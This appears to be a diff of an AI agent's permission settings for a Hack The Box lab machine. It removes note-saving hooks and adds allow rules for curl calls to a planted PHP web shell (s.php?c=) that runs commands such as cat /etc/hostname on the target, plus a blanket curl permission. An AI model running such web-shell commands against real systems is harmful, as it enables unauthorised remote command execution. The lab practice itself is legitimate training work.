@@ -3,31 +3,11 @@
     "allow": [
       "Bash(openvpn --config /htb/machines_us-4.ovpn --daemon)",
       "Bash(ip a:*)",
-      "Bash(git remote:*)"
-    ]
-  },
-  "hooks": {
-    "Stop": [
-      {
-        "hooks": [
-          {
-            "type": "command",
-            "command": "echo '{\"hookSpecificOutput\":{\"hookEventName\":\"Stop\",\"additionalContext\":\"Before stopping: (1) Append latest attempts and findings to notes.md (2) Commit notes + any changes if uncommitted\"}}'",
-            "timeout": 5
-          }
-        ]
-      }
-    ],
-    "PreCompact": [
-      {
-        "hooks": [
-          {
-            "type": "command",
-            "command": "echo '{\"hookSpecificOutput\":{\"hookEventName\":\"PreCompact\",\"additionalContext\":\"Context is about to be compacted. Before losing history: commit all uncommitted notes.md and report.md changes NOW.\"}}'",
-            "timeout": 5
-          }
-        ]
-      }
+      "Bash(git remote:*)",
+      "Bash(curl --connect-timeout 3 --max-time 5 -sg \"http://portal.variatype.htb/files/s.php?c=cat+/etc/hostname\")",
+      "Bash(curl --connect-timeout 3 --max-time 5 -sg \"http://portal.variatype.htb/files/s.php?c=ls+/tmp/sb\")",
+      "Bash(curl --connect-timeout 3 --max-time 5 -sg \"http://portal.variatype.htb/files/s.php?c=python3+-c+%22print\\(42\\)%22\")",
+      "Bash(curl:*)"
     ]
   }
 }
